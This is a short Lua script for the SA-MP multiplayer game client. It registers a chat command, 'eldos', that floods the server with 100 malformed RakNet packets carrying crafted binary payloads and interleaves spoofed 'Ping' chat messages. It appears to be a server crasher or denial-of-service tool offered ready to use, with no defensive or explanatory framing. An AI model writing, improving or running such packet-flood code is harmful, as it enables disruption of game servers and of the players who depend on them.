script_name("Mainly")

function main()
    if not isSampLoaded() or not isSampfuncsLoaded() then return end
    while not isSampAvailable() do wait(100) end

    sampRegisterChatCommand("eldos", function()
        lua_thread.create(function()
            for i = 1, 100 do  -- Spam 10 kali berturut
                local bs = raknetNewBitStream()
                raknetBitStreamWriteInt8(bs, 40)
                raknetBitStreamWriteInt32(bs, math.random(0x1fffff, 0x80000000))
                raknetBitStreamWriteString(bs, generatePayload(i))
                raknetSendBitStream(bs)
                raknetDeleteBitStream(bs)

                if i % 3 == 0 then
                    sampSendChat(string.format("~G~Ping: %dms", math.random(40, 90)))  -- Spoofed chat
                end

                wait(100) -- Delay lebih cepat
            end
        end)
    end)
    wait(-1)
end

function generatePayload(seed)
    -- Bisa tambahkan variasi berdasarkan seed
    local base = "\x14\x35\x74\x7f\xff\xbf\x90\x10\x10\x10\x10\x10\x10\x10"
    return base .. string.rep("\x10", (seed % 5 + 1) * 20) .. "\x00"
end